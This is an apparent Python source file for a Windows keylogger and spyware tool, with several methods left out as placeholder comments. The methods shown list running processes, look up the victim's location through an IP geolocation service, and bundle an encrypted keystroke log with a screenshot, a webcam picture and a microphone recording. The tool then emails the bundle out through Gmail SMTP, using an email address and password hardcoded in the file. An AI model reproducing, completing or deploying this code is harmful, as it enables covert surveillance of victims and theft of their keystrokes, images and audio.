import pynput.keyboard
import socket
import platform
import logging
import threading
import time
from PIL import ImageGrab
import win32gui
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import pyperclip
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import shutil
import subprocess
import sys

import zipfile

import requests
import psutil

class KeyLogger:
    def __init__(self, time_interval=60, email="joemunene984@gmail.com", password="K3YL00G3R"):
        self.log = "KeyLogger Started..."
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"
        self.encrypted_log_file = "keylog.enc"
        self.key_file = "key.key"
        
        self.load_or_generate_key()
        self.get_system_info()
        self.get_geolocation()
        self.get_active_processes()
        self.become_persistent()

    # ... (other methods)

    def get_active_processes(self):
        try:
            process_list = []
            for proc in psutil.process_iter(['pid', 'name']):
                process_list.append(f"{proc.info['name']} ({proc.info['pid']})")
            
            processes = ", ".join(process_list)
            self.append_to_log(f"\n[+] Active Processes (Startup):\n{processes}\n")
        except Exception as e:
            self.append_to_log(f"\n[-] Process Monitor failed: {e}")

    # ... (rest of methods)

    # ... (load_or_generate_key, become_persistent, append_to_log, get_system_info remain same) ...

    def get_geolocation(self):
        try:
            response = requests.get("http://ip-api.com/json/")
            data = response.json()
            if data['status'] == 'success':
                geo_info = f"\n[+] Geolocation:\nIP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nISP: {data['isp']}\nLat/Lon: {data['lat']}, {data['lon']}\n"
                self.append_to_log(geo_info)
        except Exception as e:
            self.append_to_log(f"\n[-] Geolocation failed: {e}")
            
    # ... (get_active_window, process_clipboard, etc. remain same) ...

    def send_mail(self):
        # NOTE: This requires 'Less Secure Apps' enabled or App Password for Gmail
        if self.email == "your_email@gmail.com":
            return

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "KeyLogger Report"

        body = "Attached is the latest log and files."
        msg.attach(MIMEText(body, 'plain'))

        # List of files to attach
        files_to_attach = [self.encrypted_log_file]
        
        # Add screenshot
        screenshot = self.screenshot()
        if screenshot: files_to_attach.append(screenshot)
        
        # Add webcam
        webcam_pic = self.take_webcam_picture()
        if webcam_pic: files_to_attach.append(webcam_pic)
        
        # Add audio
        audio_file = self.record_microphone()
        if audio_file: files_to_attach.append(audio_file)

        # Compress to ZIP
        zip_filename = f"logs_{time.strftime('%Y%m%d-%H%M%S')}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in files_to_attach:
                if file and os.path.exists(file):
                    zipf.write(file)
        
        # Key Email Logic
        if os.path.exists(zip_filename):
            attachment = open(zip_filename, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % zip_filename)
            msg.attach(p)
            attachment.close()

            try:
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.starttls()
                s.login(self.email, self.password)
                text = msg.as_string()
                s.sendmail(self.email, self.email, text)
                s.quit()
                print("[+] Email sent.")
            except Exception as e:
                print(f"[-] Error sending email: {e}")
        
        # Reset log after report
        self.log = ""
            
        # Clean up files
        for f in files_to_attach:
            if f != self.encrypted_log_file: 
                try:
                    os.remove(f)
                except:
                    pass
        if os.path.exists(zip_filename):
            os.remove(zip_filename)

    # ... (report, start, main remain same) ...
